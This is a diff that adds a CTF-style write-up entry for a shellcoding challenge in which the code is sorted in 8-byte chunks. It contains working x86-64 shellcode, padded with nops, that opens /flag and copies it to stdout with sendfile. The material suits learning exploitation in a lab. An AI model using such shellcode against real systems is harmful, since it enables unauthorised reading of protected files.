@@ -225,3 +225,71 @@ _start:
 
 flag: .asciz "/flag"
 ```
+
+#### 8
+This one is tough, our code is going to be sorted using bubble sort at each  8 bytes. We can just add nops in our code. I think that is hardly the best solution, but here is mine:
+
+```assembly
+#
+# 1.s
+# Shell
+#
+# Created by Yigit Colakoglu on 09/26/21.
+# Copyright 2021. Yigit Colakoglu. All rights reserved.
+#
+
+.global _start
+
+
+_start:
+  nop
+  movq $2, %rax  # open()
+  nop
+  movq $0, %rsi
+  nop
+  movq $0, %rdx
+  nop
+  leaq flag(%rip), %rdi # RIP relative addressing
+  nop
+  nop
+  nop
+  nop
+  nop
+  nop
+  syscall
+
+  nop
+  nop
+  nop
+  nop
+  nop
+  nop
+  nop
+  pushq %rax
+  nop
+  nop
+  nop
+  nop
+  nop
+  nop
+  nop
+  popq %rsi
+  movq $40, %rax # syscall sendfile
+  nop
+  movq $1, %rdi
+  nop
+  movq $0, %rdx
+  nop
+  movq $1000, %r10
+  nop
+  syscall
+  nop
+  nop
+  nop
+  nop
+  nop
+  nop
+
+.byte 0xFF, 0xFF, 0xFF
+flag: .ascii "/flag"
+```
